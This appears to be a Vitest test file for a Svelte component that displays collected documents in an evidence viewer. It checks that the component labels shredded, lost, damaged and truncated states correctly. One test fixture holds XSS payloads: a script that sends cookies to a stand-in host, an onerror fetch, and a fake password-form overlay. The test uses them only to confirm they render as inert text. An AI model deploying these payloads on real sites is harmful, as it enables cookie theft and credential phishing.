import { describe, expect, it, afterEach } from "vitest";
import { mount, unmount, flushSync } from "svelte";
import DocumentPanel from "./DocumentPanel.svelte";
import type { DocumentContent, DocumentView } from "./bindings";

/**
 * Five states, and the difference between them is the product.
 *
 * `artifact_document` distinguishes destroyed-on-purpose from lost from damaged
 * because reporting loss as shredding files an undetected failure as retention
 * policy (A-032). That distinction only reaches an analyst if this component
 * renders it, and increment 16 argued it while increment 23 drew it — with
 * nothing in between holding the drawing in place.
 *
 * The load-bearing assertion here is negative: **shredded carries no fault
 * styling and no alarm word.** It is the case working exactly as designed
 * (D-039).
 */

const HASH = "6fe26f4b8725d5720b4e0ede865c18ae2a51b76487b49bfafee92129e62404bd";

function view(content: DocumentContent): DocumentView {
  return {
    artifact_id: "art-1",
    media_type: "text/html",
    byte_length: 683,
    content_hash: HASH,
    content,
  };
}

let host: HTMLElement | null = null;
let component: Record<string, unknown> | null = null;

function render(content: DocumentContent): HTMLElement {
  host = document.createElement("div");
  document.body.appendChild(host);
  component = mount(DocumentPanel, { target: host, props: { doc: view(content) } });
  flushSync();
  return host;
}

afterEach(() => {
  if (component) void unmount(component);
  host?.remove();
  component = null;
  host = null;
});

describe("the document panel", () => {
  it("renders a readable document as text and never as markup", () => {
    // The page this product actually collects. If any of this were rendered as
    // markup, `querySelector` would find the elements rather than the source.
    const hostile =
      '<script>window.location="http://collector.example/?c="+document.cookie;</script>' +
      '<img src="x" onerror="fetch(\'http://collector.example\')">' +
      '<div style="position:fixed;inset:0;z-index:9999"><form><input type="password"></form></div>';

    const root = render({
      state: "readable",
      text: hostile,
      truncated_bytes: 0,
      lossy: false,
    });

    // Nothing became an element.
    expect(root.querySelector("script")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
    expect(root.querySelector("form")).toBeNull();
    expect(root.querySelector('input[type="password"]')).toBeNull();
    expect(root.querySelector("iframe")).toBeNull();

    // And all of it is on screen, as text, where an analyst can read it.
    const pre = root.querySelector("pre");
    expect(pre).not.toBeNull();
    expect(pre?.textContent).toBe(hostile);
  });

  it("presents a shredded document as a record and not as a fault", () => {
    const root = render({ state: "shredded", shredded_utc: "2026-08-14T09:00:00Z" });

    // The state block exists and is not the fault one. This is the assertion
    // that increment 16's finding survives a stylesheet refactor.
    const block = root.querySelector(".state");
    expect(block).not.toBeNull();
    expect(block?.classList.contains("destroyed")).toBe(true);
    expect(block?.classList.contains("fault")).toBe(false);

    // Tone is carried by the word first, so the word is asserted too. A screen
    // reader and a monochrome display both get it from here.
    expect(root.textContent).toContain("Destroyed");
    expect(root.textContent).not.toContain("Problem");
    expect(root.textContent).toContain("2026-08-14T09:00:00Z");

    // Provenance outlives the evidence — that is the point of crypto-shredding
    // rather than deletion, and it has to be visible at the moment somebody
    // finds the bytes gone.
    expect(root.textContent).toContain(HASH);
    expect(root.textContent).toContain("683 bytes");
    expect(root.textContent).toContain("text/html");
  });

  it("does not claim a shredding date it was not given", () => {
    const root = render({ state: "shredded", shredded_utc: null });
    expect(root.textContent).toContain("Destroyed");
    // No stray "on null", "on undefined" or "on Invalid Date".
    expect(root.textContent).not.toMatch(/on\s*(null|undefined|Invalid)/i);
  });

  it("calls loss loss and damage damage, and both of them problems", () => {
    for (const content of [
      { state: "lost" } as const,
      { state: "damaged", detail: "chacha20poly1305: authentication failed" } as const,
      { state: "unrecorded" } as const,
    ]) {
      const root = render(content);
      const block = root.querySelector(".state");
      expect(block?.classList.contains("fault")).toBe(true);
      expect(root.textContent).toContain("Problem");
      // None of the three may be described as deliberate.
      expect(root.textContent).not.toContain("Destroyed");
      expect(root.textContent?.toLowerCase()).not.toContain("shredded");
      if (component) void unmount(component);
      host?.remove();
      component = null;
    }
  });

  it("says when it is showing only part of a document", () => {
    const root = render({
      state: "readable",
      text: "the first part",
      truncated_bytes: 3 * 1024 * 1024,
      lossy: false,
    });
    // The figure has to be there: an excerpt presented as a whole document is a
    // claim that the case holds nothing else.
    expect(root.textContent).toContain("3.0 MiB");
    expect(root.textContent).toContain("are not displayed");
  });

  it("says when what it is showing is a rendering rather than the bytes", () => {
    const root = render({
      state: "readable",
      text: "binary�",
      truncated_bytes: 0,
      lossy: true,
    });
    expect(root.textContent).toContain("not valid text");
    expect(root.textContent).toContain("not the evidence");
  });
});
